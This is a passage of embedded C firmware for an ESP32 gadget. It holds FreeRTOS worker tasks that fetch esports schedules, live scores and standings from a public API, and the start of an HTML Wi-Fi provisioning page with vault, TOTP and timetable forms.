    if (s_channel_running) {
        net_unlock();
        return;   // 运行中重复调用忽略
    }
    s_channel_running = true;
    s_channel_state = APP_FETCH_RUNNING;
    s_channel_error[0] = '\0';
    net_unlock();

    // 6144：报告本身已挪到静态区，但 esp_wifi_scan_* 的调用链在无 PSRAM 的目标上
    // 仍需可观栈空间，4096 在密集环境里偏紧。
    if (xTaskCreate(channel_worker, "net_channel", 6144, NULL, 4, NULL) != pdPASS) {
        net_lock();
        s_channel_running = false;
        s_channel_state = APP_FETCH_FAILED;
        copy_trunc(s_channel_error, sizeof(s_channel_error), "任务创建失败");
        net_unlock();
        ESP_LOGE(TAG, "信道体检任务创建失败");
    }
}

bool app_net_channel_scan_running(void)
{
    net_lock();
    bool running = s_channel_running;
    net_unlock();
    return running;
}

app_fetch_state_t app_net_channel_scan_state(void)
{
    net_lock();
    app_fetch_state_t st = s_channel_state;
    net_unlock();
    return st;
}

const app_channel_report_t *app_net_channel_report(void)
{
    static app_channel_report_t buf;
    net_lock();
    if (s_channel_valid) buf = s_channel_report;
    app_channel_report_t *out = s_channel_valid ? &buf : NULL;
    net_unlock();
    return out;
}

const char *app_net_channel_error(void)
{
    static char buf[64];
    net_lock();
    if (s_channel_state == APP_FETCH_FAILED && s_channel_error[0]) {
        copy_trunc(buf, sizeof(buf), s_channel_error);
    } else {
        buf[0] = '\0';
    }
    net_unlock();
    return buf;
}

// ---------------------------------------------------------------------------
// 赛事数据 worker
// ---------------------------------------------------------------------------

// 战队代号：优先 code，缺失时退回 name。
static const char *team_code(const cJSON *team)
{
    if (!cJSON_IsObject(team)) return NULL;
    const char *code = json_str(team, "code");
    if (code && code[0]) return code;
    return json_str(team, "name");
}

static int team_wins(const cJSON *team)
{
    if (!cJSON_IsObject(team)) return 0;
    const cJSON *result = json_obj(team, "result");
    return json_int(result, "gameWins", 0);
}

static void esports_worker(void *arg)
{
    (void)arg;
    app_fetch_state_t final = APP_FETCH_FAILED;
    char err[64] = { 0 };

    if (!ensure_online()) {
        copy_trunc(err, sizeof(err), "未联网");
        goto done;
    }

    // ---- getSchedule：今日与本周赛程 ----
    {
        char url[128];
        snprintf(url, sizeof(url), LOLESPORTS_BASE "getSchedule?hl=zh-CN");

        char *body = NULL;
        if (http_get_json(url, &body, NULL, err, sizeof(err)) != ESP_OK) {
            if (!err[0]) copy_trunc(err, sizeof(err), "赛程请求失败");
            goto done;
        }

        cJSON *root = cJSON_Parse(body);
        free(body);
        if (!root) {
            copy_trunc(err, sizeof(err), "赛程解析失败");
            goto done;
        }

        const cJSON *events = json_obj(json_obj(json_obj(root, "data"), "schedule"), "events");
        if (!cJSON_IsArray(events)) {
            cJSON_Delete(root);
            copy_trunc(err, sizeof(err), "赛程为空");
            goto done;
        }

        // 时间窗口：今天 00:00 本地时间 ~ 今天 + 7 天。
        int64_t now_utc = (int64_t)app_state_now_unix();
        int offset = app_state_settings()->utc_offset_minutes * 60;
        int64_t local_now = now_utc + offset;
        int64_t day0_local = local_now - (local_now % 86400);
        int64_t window_start = day0_local - offset;
        int64_t window_end = window_start + 7 * 86400;

        app_esport_match_t *tmp =
            (app_esport_match_t *)calloc(APP_ESPORT_MAX_MATCHES, sizeof(app_esport_match_t));
        if (!tmp) {
            cJSON_Delete(root);
            copy_trunc(err, sizeof(err), "内存不足");
            goto done;
        }

        int count = 0;
        const cJSON *ev = NULL;
        cJSON_ArrayForEach(ev, events) {
            if (count >= APP_ESPORT_MAX_MATCHES) break;
            const char *type = json_str(ev, "type");
            if (!type || strcmp(type, "match") != 0) continue;

            const cJSON *match = json_obj(ev, "match");
            if (!cJSON_IsObject(match)) continue;

            int start_utc = iso_utc_to_unix(json_str(ev, "startTime"));
            if (start_utc <= 0) continue;
            if ((int64_t)start_utc < window_start || (int64_t)start_utc > window_end) continue;

            app_esport_match_t *m = &tmp[count];
            copy_trunc(m->id, sizeof(m->id), json_str(match, "id"));
            copy_trunc(m->league, sizeof(m->league), json_str(json_obj(ev, "league"), "name"));
            copy_trunc(m->block, sizeof(m->block), json_str(ev, "blockName"));

            const cJSON *teams = json_obj(match, "teams");
            if (cJSON_IsArray(teams)) {
                const cJSON *t0 = cJSON_GetArrayItem(teams, 0);
                const cJSON *t1 = cJSON_GetArrayItem(teams, 1);
                copy_trunc(m->team_a, sizeof(m->team_a), team_code(t0));
                copy_trunc(m->team_b, sizeof(m->team_b), team_code(t1));
                m->score_a = team_wins(t0);
                m->score_b = team_wins(t1);
            }
            m->start_utc = start_utc;
            m->state = app_esport_state_from_text(json_str(ev, "state"));
            if (m->state == APP_MATCH_UNKNOWN) m->state = APP_MATCH_UPCOMING;
            count++;
        }
        cJSON_Delete(root);

        // ---- getLive：用实时状态与比分覆盖已有比赛 ----
        snprintf(url, sizeof(url), LOLESPORTS_BASE "getLive?hl=zh-CN");
        body = NULL;
        if (http_get_json(url, &body, NULL, NULL, 0) == ESP_OK) {
            cJSON *live_root = cJSON_Parse(body);
            free(body);
            if (live_root) {
                const cJSON *live_events =
                    json_obj(json_obj(live_root, "data"), "events");
                const cJSON *le = NULL;
                cJSON_ArrayForEach(le, live_events) {
                    const cJSON *match = json_obj(le, "match");
                    const char *id = json_str(cJSON_IsObject(match) ? match : le, "id");
                    if (!id) continue;
                    for (int i = 0; i < count; i++) {
                        if (strcmp(tmp[i].id, id) != 0) continue;
                        tmp[i].state = APP_MATCH_LIVE;
                        const cJSON *teams = json_obj(match, "teams");
                        if (cJSON_IsArray(teams)) {
                            tmp[i].score_a = team_wins(cJSON_GetArrayItem(teams, 0));
                            tmp[i].score_b = team_wins(cJSON_GetArrayItem(teams, 1));
                        }
                        break;
                    }
                }
                cJSON_Delete(live_root);
            }
        }

        // ---- 提交（保留 followed[]/follow_count，由 UI 维护）----
        net_lock();
        app_esport_cache_t *cache = app_state_esports();
        if (count > 0) {
            memcpy(cache->matches, tmp, sizeof(app_esport_match_t) * (size_t)count);
        }
        cache->match_count = count;
        free(tmp);
        app_esport_apply_follows(cache);
        cache->fetched_utc = (int)app_state_now_unix();
        cache->valid = true;
        app_state_save_esports();
        net_unlock();

        final = APP_FETCH_OK;
    }

done:
    net_lock();
    s_fetch_state = final;
    if (final == APP_FETCH_OK) {
        s_fetch_error[0] = '\0';
    } else {
        copy_trunc(s_fetch_error, sizeof(s_fetch_error), err[0] ? err : "拉取失败");
    }
    bool in_center = s_esports_in_center;
    bool detail_busy = s_detail_running;
    s_worker_running = false;
    net_unlock();

    // 详情拉取可能正在等同一次 Wi-Fi 窗口，别把它脚下的射频关掉。
    if (!in_center && !detail_busy) app_net_wifi_stop();
    app_metrics_stack("net_esports 退出");
    vTaskDelete(NULL);
}

void app_net_esports_fetch(void)
{
    if (!s_inited) return;

    net_lock();
    if (s_worker_running) {
        net_unlock();
        return;   // 运行中重复调用忽略
    }
    s_worker_running = true;
    s_fetch_state = APP_FETCH_RUNNING;
    s_fetch_error[0] = '\0';
    s_esports_in_center = true;
    net_unlock();

    if (xTaskCreate(esports_worker, "net_esports", 8192, NULL, 4, NULL) != pdPASS) {
        net_lock();
        s_worker_running = false;
        s_fetch_state = APP_FETCH_FAILED;
        copy_trunc(s_fetch_error, sizeof(s_fetch_error), "任务创建失败");
        net_unlock();
        ESP_LOGE(TAG, "赛事拉取任务创建失败");
    }
}

app_fetch_state_t app_net_esports_state(void)
{
    net_lock();
    app_fetch_state_t st = s_fetch_state;
    net_unlock();
    return st;
}

const char *app_net_esports_error(void)
{
    static char buf[64];
    net_lock();
    if (s_fetch_state == APP_FETCH_FAILED && s_fetch_error[0]) {
        copy_trunc(buf, sizeof(buf), s_fetch_error);
    } else {
        buf[0] = '\0';
    }
    net_unlock();
    return buf[0] ? buf : NULL;
}

void app_net_esports_stop(void)
{
    net_lock();
    s_esports_in_center = false;
    bool running = s_worker_running || s_detail_running;
    net_unlock();

    // 没有在跑的 worker 时直接释放；有则让 worker 结束时自行释放。
    if (!running) app_net_wifi_stop();
}

// ---------------------------------------------------------------------------
// 单场对局详情（getEventDetails 选局 + window feed 取数据）
// ---------------------------------------------------------------------------

// 把 window 的 participantMetadata 按顺序填成选手数组：participantId 1..5 即
// 上单/打野/中单/下路/辅助。
static void detail_fill_lineup(const cJSON *meta_team, app_esport_player_t *out)
{
    const cJSON *list = json_obj(meta_team, "participantMetadata");
    if (!cJSON_IsArray(list)) return;

    const cJSON *p = NULL;
    int i = 0;
    cJSON_ArrayForEach(p, list) {
        if (i >= APP_ESPORT_TEAM_PLAYERS) break;
        app_esport_player_t *pl = &out[i++];
        copy_trunc(pl->champion, sizeof(pl->champion), json_str(p, "championId"));
        copy_trunc(pl->player, sizeof(pl->player), json_str(p, "summonerName"));
        pl->role = app_esport_role_from_text(json_str(p, "role"));
    }
}

// 用一帧里的 participants 覆盖选手金币与 KDA；participantId 直接对应数组下标。
static void detail_apply_frame_team(const cJSON *team, app_esport_player_t *out)
{
    const cJSON *list = json_obj(team, "participants");
    if (!cJSON_IsArray(list)) return;

    const cJSON *p = NULL;
    cJSON_ArrayForEach(p, list) {
        int pid = json_int(p, "participantId", 0);
        if (pid < 1 || pid > APP_ESPORT_TEAM_PLAYERS) continue;
        app_esport_player_t *pl = &out[pid - 1];
        pl->gold    = json_int(p, "totalGold", pl->gold);
        pl->kills   = json_int(p, "kills", pl->kills);
        pl->deaths  = json_int(p, "deaths", pl->deaths);
        pl->assists = json_int(p, "assists", pl->assists);
    }
}

// 追加一个经济采样点；超出上限时丢弃最早的点，保留最近的走势。
static void detail_push_gold(app_esport_detail_t *d, int ga, int gb)
{
    if (d->gold_points >= APP_ESPORT_GOLD_POINTS) {
        for (int i = 1; i < APP_ESPORT_GOLD_POINTS; i++) {
            d->gold_a[i - 1] = d->gold_a[i];
            d->gold_b[i - 1] = d->gold_b[i];
        }
        d->gold_points = APP_ESPORT_GOLD_POINTS - 1;
    }
    d->gold_a[d->gold_points] = ga;
    d->gold_b[d->gold_points] = gb;
    d->gold_points++;
}

// 解析 window 响应：metadata 提供阵容，frames 提供经济采样与选手快照。
// a_is_blue 表示 team_a 本局在蓝色方，用于把接口的蓝/红归一成 team_a/team_b。
static void detail_parse_window(const cJSON *root, app_esport_detail_t *d, bool a_is_blue)
{
    const cJSON *meta = json_obj(root, "gameMetadata");
    detail_fill_lineup(json_obj(meta, "blueTeamMetadata"), a_is_blue ? d->team_a : d->team_b);
    detail_fill_lineup(json_obj(meta, "redTeamMetadata"),  a_is_blue ? d->team_b : d->team_a);

    const cJSON *frames = json_obj(root, "frames");
    if (!cJSON_IsArray(frames)) return;

    // 已结束多时的比赛只会返回开局占位帧（经济全 0），这些帧必须跳过，
    // 否则界面会把 0 当成真实数据画一条平线。
    const cJSON *f = NULL;
    const cJSON *best = NULL;
    int best_total = 0;
    cJSON_ArrayForEach(f, frames) {
        int bg = json_int(json_obj(f, "blueTeam"), "totalGold", 0);
        int rg = json_int(json_obj(f, "redTeam"), "totalGold", 0);
        if (bg <= 0 && rg <= 0) continue;
        detail_push_gold(d, a_is_blue ? bg : rg, a_is_blue ? rg : bg);
        if (bg + rg >= best_total) {
            best_total = bg + rg;
            best = f;
        }
    }
    if (!best) return;

    // 取经济最领先的一帧作为选手数据快照。
    const cJSON *blue = json_obj(best, "blueTeam");
    const cJSON *red  = json_obj(best, "redTeam");
    detail_apply_frame_team(a_is_blue ? blue : red, d->team_a);
    detail_apply_frame_team(a_is_blue ? red : blue, d->team_b);
}

static void esports_detail_worker(void *arg)
{
    char *id = (char *)arg;   // 由 fetch 分配，worker 负责释放
    app_fetch_state_t final = APP_FETCH_FAILED;
    char err[64] = { 0 };
    app_esport_detail_t *det =
        (app_esport_detail_t *)calloc(1, sizeof(app_esport_detail_t));

    if (!det) {
        copy_trunc(err, sizeof(err), "内存不足");
        free(id);
        goto done;
    }
    copy_trunc(det->match_id, sizeof(det->match_id), id);
    free(id);
    id = NULL;

    // 与赛程拉取串行：等它结束再联网，避免同时占用 Wi-Fi 与 64 KB 响应缓冲。
    for (int i = 0; i < 120 && s_worker_running; i++) vTaskDelay(pdMS_TO_TICKS(100));

    if (!ensure_online()) {
        copy_trunc(err, sizeof(err), "未联网");
        goto done;
    }

    // ---- getEventDetails：选一局并确定双方阵营 ----
    {
        char url[176];
        snprintf(url, sizeof(url), LOLESPORTS_BASE "getEventDetails?hl=zh-CN&id=%s",
                 det->match_id);

        char *body = NULL;
        if (http_get_json(url, &body, NULL, err, sizeof(err)) != ESP_OK) {
            if (!err[0]) copy_trunc(err, sizeof(err), "详情请求失败");
            goto done;
        }
        cJSON *root = cJSON_Parse(body);
        free(body);
        if (!root) {
            copy_trunc(err, sizeof(err), "详情解析失败");
            goto done;
        }

        const cJSON *match = json_obj(json_obj(json_obj(root, "data"), "event"), "match");
        const cJSON *teams = json_obj(match, "teams");
        const cJSON *games = json_obj(match, "games");

        // 选局：进行中优先，其次最后一局已结束，都没有时用第一局未开始。
        const cJSON *pick = NULL;
        const cJSON *g = NULL;
        cJSON_ArrayForEach(g, games) {
            app_match_state_t st = app_esport_state_from_text(json_str(g, "state"));
            if (st == APP_MATCH_LIVE) {
                pick = g;
                break;
            }
            if (st == APP_MATCH_FINISHED) pick = g;
            else if (st == APP_MATCH_UPCOMING && !pick) pick = g;
        }

        if (!cJSON_IsObject(pick)) {
            cJSON_Delete(root);
            copy_trunc(err, sizeof(err), "该场次暂无对局信息");
            goto done;
        }
        det->game_number = json_int(pick, "number", 0);
        copy_trunc(det->game_state, sizeof(det->game_state), json_str(pick, "state"));

        // window 只按蓝/红给数据；按 match.teams[0]（即 team_a）在本局的阵营归一。
        bool a_is_blue = true;
        const cJSON *a_team = cJSON_IsArray(teams) ? cJSON_GetArrayItem(teams, 0) : NULL;
        const char *a_id = json_str(a_team, "id");
        if (a_id) {
            const cJSON *gt = json_obj(pick, "teams");
            for (int i = 0; i < cJSON_GetArraySize(gt); i++) {
                const cJSON *entry = cJSON_GetArrayItem(gt, i);
                const char *gid = json_str(entry, "id");
                const char *side = json_str(entry, "side");
                if (gid && side && strcmp(gid, a_id) == 0) {
                    a_is_blue = (strcmp(side, "blue") == 0);
                    break;
                }
            }
        }

        const char *game_id = json_str(pick, "id");
        if (!game_id || game_id[0] == '\0') {
            cJSON_Delete(root);
            copy_trunc(err, sizeof(err), "该对局无实时数据");
            goto done;
        }

        // ---- window feed：阵容 + 经济 + 选手 ----
        snprintf(url, sizeof(url), LOLESPORTS_FEED "%s", game_id);
        body = NULL;
        if (http_get_json(url, &body, NULL, NULL, 0) == ESP_OK) {
            cJSON *wroot = cJSON_Parse(body);
            free(body);
            if (wroot) {
                detail_parse_window(wroot, det, a_is_blue);
                cJSON_Delete(wroot);
            }
        }
        cJSON_Delete(root);
    }

    if (!(det->team_a[0].champion[0] || det->team_a[0].player[0] ||
          det->team_b[0].champion[0] || det->team_b[0].player[0])) {
        copy_trunc(err, sizeof(err), "暂无阵容数据");
        goto done;
    }

    det->valid = true;
    det->fetched_utc = (int)app_state_now_unix();

    net_lock();
    app_state_esports()->detail = *det;
    app_state_save_esports();
    net_unlock();

    final = APP_FETCH_OK;

done:
    free(det);
    net_lock();
    s_detail_state = final;
    if (final == APP_FETCH_OK) {
        s_detail_error[0] = '\0';
    } else {
        copy_trunc(s_detail_error, sizeof(s_detail_error), err[0] ? err : "拉取失败");
    }
    bool in_center = s_esports_in_center;
    s_detail_running = false;
    net_unlock();

    if (!in_center) app_net_wifi_stop();   // 用户已离开赛事中心，释放射频
    app_metrics_stack("net_esdetail 退出");
    vTaskDelete(NULL);
}

void app_net_esport_detail_fetch(const char *match_id)
{
    if (!s_inited || !match_id || match_id[0] == '\0') return;

    net_lock();
    if (s_detail_running) {
        net_unlock();
        return;   // 运行中重复调用忽略
    }
    char *id = (char *)malloc(strlen(match_id) + 1);
    if (!id) {
        net_unlock();
        return;
    }
    strcpy(id, match_id);

    s_detail_running = true;
    s_detail_state = APP_FETCH_RUNNING;
    s_detail_error[0] = '\0';
    s_esports_in_center = true;
    net_unlock();

    if (xTaskCreate(esports_detail_worker, "net_esdetail", 8192, id, 4, NULL) != pdPASS) {
        free(id);
        net_lock();
        s_detail_running = false;
        s_detail_state = APP_FETCH_FAILED;
        copy_trunc(s_detail_error, sizeof(s_detail_error), "任务创建失败");
        net_unlock();
        ESP_LOGE(TAG, "详情拉取任务创建失败");
    }
}

app_fetch_state_t app_net_esport_detail_state(void)
{
    net_lock();
    app_fetch_state_t st = s_detail_state;
    net_unlock();
    return st;
}

const char *app_net_esport_detail_error(void)
{
    static char buf[64];
    net_lock();
    if (s_detail_state == APP_FETCH_FAILED && s_detail_error[0]) {
        copy_trunc(buf, sizeof(buf), s_detail_error);
    } else {
        buf[0] = '\0';
    }
    net_unlock();
    return buf[0] ? buf : NULL;
}

// ---------------------------------------------------------------------------
// 赛区与积分榜
// ---------------------------------------------------------------------------

// 赛区缓存项。
typedef struct {
    char name[NET_LEAGUE_NAME_LEN];
    char slug[NET_LEAGUE_SLUG_LEN];
} net_league_t;

static net_league_t s_leagues[NET_LEAGUE_MAX];
static int s_league_count;
static bool s_leagues_running;
static bool s_standings_running;

static void leagues_worker(void *arg)
{
    (void)arg;

    char url[128];
    snprintf(url, sizeof(url), LOLESPORTS_BASE "getLeagues?hl=zh-CN");

    char *body = NULL;
    if (http_get_json(url, &body, NULL, NULL, 0) == ESP_OK) {
        cJSON *root = cJSON_Parse(body);
        free(body);
        if (root) {
            const cJSON *leagues = json_obj(json_obj(root, "data"), "leagues");
            if (cJSON_IsArray(leagues)) {
                net_lock();
                int count = 0;
                const cJSON *lg = NULL;
                cJSON_ArrayForEach(lg, leagues) {
                    if (count >= NET_LEAGUE_MAX) break;
                    const char *slug = json_str(lg, "slug");
                    if (!slug || !slug[0]) continue;
                    const char *name = json_str(lg, "name");
                    copy_trunc(s_leagues[count].name, sizeof(s_leagues[count].name),
                               (name && name[0]) ? name : slug);
                    copy_trunc(s_leagues[count].slug, sizeof(s_leagues[count].slug), slug);
                    count++;
                }
                s_league_count = count;
                net_unlock();
            }
            cJSON_Delete(root);
        }
    }

    net_lock();
    s_leagues_running = false;
    net_unlock();
    app_metrics_stack("net_leagues 退出");
    vTaskDelete(NULL);
}

void app_net_leagues_fetch(void)
{
    if (!s_inited) return;

    net_lock();
    if (s_leagues_running) {
        net_unlock();
        return;
    }
    s_leagues_running = true;
    net_unlock();

    if (xTaskCreate(leagues_worker, "net_leagues", 4096, NULL, 4, NULL) != pdPASS) {
        net_lock();
        s_leagues_running = false;
        net_unlock();
        ESP_LOGE(TAG, "赛区拉取任务创建失败");
    }
}

int app_net_league_count(void)
{
    net_lock();
    int n = s_league_count;
    net_unlock();
    return n;
}

const char *app_net_league_name(int index)
{
    static char buf[NET_LEAGUE_NAME_LEN];
    net_lock();
    if (index < 0 || index >= s_league_count) {
        buf[0] = '\0';
    } else {
        copy_trunc(buf, sizeof(buf), s_leagues[index].name);
    }
    net_unlock();
    return buf;
}

const char *app_net_league_slug(int index)
{
    static char buf[NET_LEAGUE_SLUG_LEN];
    net_lock();
    if (index < 0 || index >= s_league_count) {
        buf[0] = '\0';
    } else {
        copy_trunc(buf, sizeof(buf), s_leagues[index].slug);
    }
    net_unlock();
    return buf;
}

static void standings_worker(void *arg)
{
    char *slug_arg = (char *)arg;    // 由调用方 malloc，本任务负责 free
    char slug[NET_LEAGUE_SLUG_LEN];

    if (slug_arg) {
        copy_trunc(slug, sizeof(slug), slug_arg);
        free(slug_arg);
    } else {
        // slug 为 NULL：优先 LPL，否则用已缓存的第一条，再否则 "lpl"。
        net_lock();
        bool has_lpl = false;
        for (int i = 0; i < s_league_count; i++) {
            if (strcmp(s_leagues[i].slug, "lpl") == 0) { has_lpl = true; break; }
        }
        if (has_lpl) {
            copy_trunc(slug, sizeof(slug), "lpl");
        } else if (s_league_count > 0) {
            copy_trunc(slug, sizeof(slug), s_leagues[0].slug);
        } else {
            copy_trunc(slug, sizeof(slug), "lpl");
        }
        net_unlock();
    }

    if (!ensure_online()) goto done;

    char tournament_id[40] = { 0 };
    {
        // 取该赛区最近一个赛事（startDate 最大）。
        char url[192];
        snprintf(url, sizeof(url),
                 LOLESPORTS_BASE "getTournamentsForLeague?hl=zh-CN&leagueId=%s", slug);

        char *body = NULL;
        if (http_get_json(url, &body, NULL, NULL, 0) != ESP_OK) goto done;

        cJSON *root = cJSON_Parse(body);
        free(body);
        if (!root) goto done;

        const cJSON *leagues = json_obj(json_obj(root, "data"), "leagues");
        const cJSON *lg0 = cJSON_GetArrayItem(leagues, 0);
        const cJSON *tournaments = json_obj(lg0, "tournaments");
        const char *best_id = NULL;
        const char *best_start = NULL;
        const cJSON *tr = NULL;
        cJSON_ArrayForEach(tr, tournaments) {
            const char *id = json_str(tr, "id");
            if (!id || !id[0]) continue;
            const char *sd = json_str(tr, "startDate");
            if (!best_id) {
                best_id = id;
                best_start = sd;
            } else if (sd && (!best_start || strcmp(sd, best_start) > 0)) {
                best_id = id;
                best_start = sd;
            }
        }
        if (best_id) copy_trunc(tournament_id, sizeof(tournament_id), best_id);
        cJSON_Delete(root);
    }

    if (!tournament_id[0]) goto done;

    {
        char url[176];
        snprintf(url, sizeof(url),
                 LOLESPORTS_BASE "getStandings?hl=zh-CN&tournamentId=%s", tournament_id);

        char *body = NULL;
        if (http_get_json(url, &body, NULL, NULL, 0) != ESP_OK) goto done;

        cJSON *root = cJSON_Parse(body);
        free(body);
        if (!root) goto done;

        app_esport_team_t teams[APP_ESPORT_MAX_TEAMS];
        int count = 0;
        const cJSON *standings = json_obj(json_obj(root, "data"), "standings");
        const cJSON *st = NULL;
        cJSON_ArrayForEach(st, standings) {
            const cJSON *arr = json_obj(st, "teams");
            const cJSON *t = NULL;
            cJSON_ArrayForEach(t, arr) {
                if (count >= APP_ESPORT_MAX_TEAMS) break;
                const char *code = json_str(t, "code");
                const char *name = json_str(t, "name");
                const cJSON *record = json_obj(t, "record");
                app_esport_team_t *dst = &teams[count];
                memset(dst, 0, sizeof(*dst));
                copy_trunc(dst->name, sizeof(dst->name),
                           (code && code[0]) ? code : (name ? name : ""));
                dst->win = json_int(record, "wins", 0);
                dst->loss = json_int(record, "losses", 0);
                dst->points = dst->win;
                if (dst->name[0]) count++;
            }
        }
        cJSON_Delete(root);

        net_lock();
        app_esport_cache_t *cache = app_state_esports();
        memcpy(cache->teams, teams, sizeof(app_esport_team_t) * (size_t)count);
        cache->team_count = count;
        // 联赛显示名：优先用缓存里的中文名。
        const char *disp = slug;
        for (int i = 0; i < s_league_count; i++) {
            if (strcmp(s_leagues[i].slug, slug) == 0) { disp = s_leagues[i].name; break; }
        }
        copy_trunc(cache->standings_league, sizeof(cache->standings_league), disp);
        app_state_save_esports();
        net_unlock();
    }

done:
    net_lock();
    s_standings_running = false;
    net_unlock();
    app_metrics_stack("net_standings 退出");
    vTaskDelete(NULL);
}

void app_net_standings_fetch(const char *slug)
{
    if (!s_inited) return;

    net_lock();
    if (s_standings_running) {
        net_unlock();
        return;
    }
    s_standings_running = true;
    net_unlock();

    char *slug_copy = NULL;
    if (slug && slug[0]) {
        size_t n = strlen(slug);
        if (n > NET_LEAGUE_SLUG_LEN - 1) n = NET_LEAGUE_SLUG_LEN - 1;
        slug_copy = (char *)malloc(n + 1);
        if (slug_copy) {
            memcpy(slug_copy, slug, n);
            slug_copy[n] = '\0';
        }
    }

    if (xTaskCreate(standings_worker, "net_standings", 6144, slug_copy, 4, NULL) != pdPASS) {
        free(slug_copy);
        net_lock();
        s_standings_running = false;
        net_unlock();
        ESP_LOGE(TAG, "积分榜拉取任务创建失败");
    }
}

// ---------------------------------------------------------------------------
// 热点配网
// ---------------------------------------------------------------------------

static const char PROV_PAGE[] =
    "<!DOCTYPE html>\n"
    "<html lang=\"zh-CN\"><head><meta charset=\"utf-8\">\n"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n"
    "<title>FoloToy AI Passport 配置</title>\n"
    "<style>\n"
    "body{font-family:-apple-system,system-ui,sans-serif;margin:0;padding:20px;background:#f5f5f0;color:#222;}\n"
    "h1{font-size:20px;margin:0 0 4px;}\n"
    "h2{font-size:16px;margin:0 0 10px;}\n"
    ".hint{color:#666;font-size:13px;margin:0 0 16px;}\n"
    ".st{color:#666;font-size:13px;margin:6px 0 0;line-height:1.6;}\n"
    "form{background:#fff;border-radius:12px;padding:16px;margin-bottom:14px;box-shadow:0 1px 3px rgba(0,0,0,.08);}\n"
    "label{display:block;font-size:13px;color:#444;margin:8px 0 4px;}\n"
    "input,textarea,select{width:100%;box-sizing:border-box;padding:10px;border:1px solid #ccc;border-radius:8px;font-size:15px;}\n"
    "textarea{font-size:14px;font-family:ui-monospace,Menlo,Consolas,monospace;line-height:1.5;}\n"
    "button{margin-top:12px;width:100%;padding:12px;border:0;border-radius:8px;background:#2f6f4f;color:#fff;font-size:15px;}\n"
    ".row{display:flex;gap:8px;}\n"
    ".row>div{flex:1;}\n"
    ".item{display:flex;justify-content:space-between;align-items:center;gap:8px;border-bottom:1px solid #eee;padding:8px 0;font-size:14px;}\n"
    ".item form{background:none;padding:0;margin:0;box-shadow:none;width:auto;}\n"
    ".item button{width:auto;margin:0;padding:6px 10px;background:#b0403c;font-size:13px;}\n"
    "</style></head><body>\n"
    "<h1>FoloToy AI Passport</h1>\n"
    "<p class=\"hint\">除了「联网校时」和「LOL 赛事」，这里填的内容都保存在设备上：重启后仍在，断网也能用。</p>\n"

    "<form method=\"post\" action=\"/wifi\">\n"
    "<h2>Wi-Fi 配网</h2>\n"
    "<label>Wi-Fi 名称 (SSID)</label><input name=\"ssid\" maxlength=\"32\" required>\n"
    "<label>Wi-Fi 密码</label><input name=\"pass\" type=\"password\" maxlength=\"64\">\n"
    "<button type=\"submit\">保存并连接</button>\n"
    "</form>\n"

    "<form method=\"post\" action=\"/time\" id=\"tf\">\n"
    "<h2>时间校准</h2>\n"
    "<label>需要联网；不校时设备也能走时，只是会慢慢偏。</label>\n"
    "<input type=\"hidden\" name=\"t\" id=\"t\">\n"
    "<button type=\"submit\">用手机时间校准设备</button>\n"
    "</form>\n"

    "<form method=\"post\" action=\"/vault\">\n"
    "<h2>密码本</h2>\n"
    "<label>名称</label><input name=\"label\" maxlength=\"8\" placeholder=\"校园网\">\n"
    "<label>账号</label><input name=\"account\" maxlength=\"40\">\n"
    "<label>密码</label><input name=\"password\" maxlength=\"48\">\n"
    "<button type=\"submit\">保存一条</button>\n"
    "<p class=\"st\">口令只在设备小屏上查看，网页不回显。若设备上开启了加密，需先在设备上用手势解锁再保存。</p>\n"
    "</form>\n"
    "<div id=\"vaultList\" class=\"st\"></div>\n"
    "<form method=\"post\" action=\"/vault_unlock\">\n"
    "<h2>忘了手势？用恢复码解锁</h2>\n"
    "<label>恢复码（设备上生成的那串，忽略横线）</label>"
    "<input name=\"code\" maxlength=\"40\" placeholder=\"ABCDE-FGHJK-...\">\n"
    "<button type=\"submit\">用恢复码解锁</button>\n"
    "<p class=\"st\">设备只有三个键，敲不了 31 位恢复码，所以在这里输入。解锁后即可继续添加条目。</p>\n"
    "</form>\n"

    "<form method=\"post\" action=\"/totp_secret\">\n"
    "<h2>动态口令</h2>\n"
    "<label>备注名</label><input name=\"label\" maxlength=\"8\" placeholder=\"校园邮箱\">\n"
    "<label>密钥（Base32 或 16 进制，10-64 位，可含空格/横线）</label>\n"
    "<input name=\"secret\" maxlength=\"80\" placeholder=\"JBSWY3DPEHPK3PXP\">\n"
    "<label>验证码位数</label><select name=\"digits\">"
    "<option value=\"6\">6 位</option><option value=\"8\">8 位</option></select>\n"
    "<label>刷新周期（秒）</label><input name=\"period\" type=\"number\" min=\"10\" max=\"300\" value=\"30\">\n"
    "<label>算法</label><select name=\"algorithm\">"
    "<option value=\"SHA1\">SHA1</option><option value=\"SHA256\">SHA256</option></select>\n"
    "<button type=\"submit\">添加口令</button>\n"
    "<p class=\"st\">只填密钥即可，编码形式自动识别；位数/周期/算法可留默认（6 位 / 30 秒 / SHA1）。</p>\n"
    "</form>\n"
    "<form method=\"post\" action=\"/totp\">\n"
    "<label>或粘贴 otpauth:// 链接</label>\n"
    "<input name=\"uri\" maxlength=\"180\" placeholder=\"otpauth://totp/...\">\n"
    "<button type=\"submit\">添加口令</button>\n"
    "</form>\n"
    "<div id=\"totpList\" class=\"st\"></div>\n"

    "<form method=\"post\" action=\"/routine\">\n"
    "<h2>作息表</h2>\n"
    "<label>每行一节：08:00-08:45 第一节，可带 # 注释</label>\n"
    "<textarea name=\"text\" rows=\"8\" maxlength=\"5000\" "
    "placeholder=\"08:00-08:45 第一节&#10;08:45-08:55 课间&#10;# 用 @单周 / @双周 分别写两套作息&#10;# @周一 起只改某一天，@周三 再换一天\"></textarea>\n"
    "<button type=\"submit\">导入作息表</button>\n"
    "</form>\n"

    "<form method=\"post\" action=\"/pomo\" id=\"pf\">\n"
    "<h2>番茄钟</h2>\n"
    "<div class=\"row\"><div><label>专注（分钟）</label><input name=\"focus\" id=\"pf_focus\" inputmode=\"numeric\"></div>\n"
    "<div><label>短休息</label><input name=\"brk\" id=\"pf_brk\" inputmode=\"numeric\"></div></div>\n"
    "<div class=\"row\"><div><label>长休息</label><input name=\"long\" id=\"pf_long\" inputmode=\"numeric\"></div>\n"
    "<div><label>几段后长休</label><input name=\"cycles\" id=\"pf_cycles\" inputmode=\"numeric\"></div></div>\n"
    "<label><input type=\"checkbox\" name=\"auto\" id=\"pf_auto\" value=\"1\" style=\"width:auto\"> 阶段结束后自动接续</label>\n"
    "<label><input type=\"checkbox\" name=\"dnd\" id=\"pf_dnd\" value=\"1\" style=\"width:auto\"> 专注时免打扰（暂缓提醒与提示音）</label>\n"
    "<p class=\"st\" id=\"pf_stats\"></p>\n"
